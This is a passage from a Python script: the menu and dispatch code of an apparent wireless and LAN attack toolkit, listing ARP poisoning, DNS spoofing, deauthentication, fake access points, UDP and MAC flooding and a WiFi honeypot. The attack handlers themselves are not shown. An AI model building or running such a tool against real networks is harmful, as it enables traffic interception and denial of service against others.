			print(''+O+'1 '+W+'- '+R+'ARP Cache poison'+W+'				'+O+'10 '+W+'- '+R+'MAC address flood'+W+'')
			print(''+O+'2 '+W+'- '+R+'Pull IP addresses'+W+'				'+O+'11 '+W+'- '+R+'Deauthenticate all clients'+W+'')
			print(''+O+'3 '+W+'- '+R+'Sniff DNS queries'+W+'				'+O+'12 '+W+'- '+R+'WiFi Honeypot'+W+'')
			print(''+O+'4 '+W+'- '+R+'Sniff wireless access points and clients'+W+'')
			print(''+O+'5 '+W+'- '+R+'Stage a deauthentication attack'+W+'')
			print(''+O+'6 '+W+'- '+R+'Generate fake Access Point'+W+'')
			print(''+O+'7 '+W+'- '+R+'Scan for internal IP and MAC addresses'+W+'')
			print(''+O+'8 '+W+'- '+R+'DNS spoof'+W+'')
			print(''+O+'9 '+W+'- '+R+'UDP flooder'+W+'')
			print(''+O+'0 '+W+'- '+R+'Exit'+W+'\n')
		 
		
		elif str(choice) == '0':
			print('\n'+W+'['+R+'!'+W+'] Exiting')
			sys.exit()
		elif str(choice) == '1':
			poisonChoice()
		elif str(choice) == '2':
			pullipsChoice()
		elif str(choice) == '3':
			dnssniffChoice()
		elif str(choice) == '4':
			comm = 'sniff'
			APclisniffChoice(comm)
		elif str(choice) == '5':
			comm = 'attack'
			APclisniffChoice(comm)
		elif str(choice) == '6':
			fakeAPClient()
		elif str(choice) == '7':
			internalScanChoice()
		elif str(choice) == '8':
			DNSspoofChoice()
		elif str(choice) == '9':
			UDPfloodChoice()
		elif str(choice) == '10':
			MACfloodChoice()
		elif str(choice) == '11':
			massChoice()
		elif str(choice) == '12':
			honeypotChoice()
		elif str(choice) == '':
			titl = False
		else:
			print('[!] That is not an option')

main()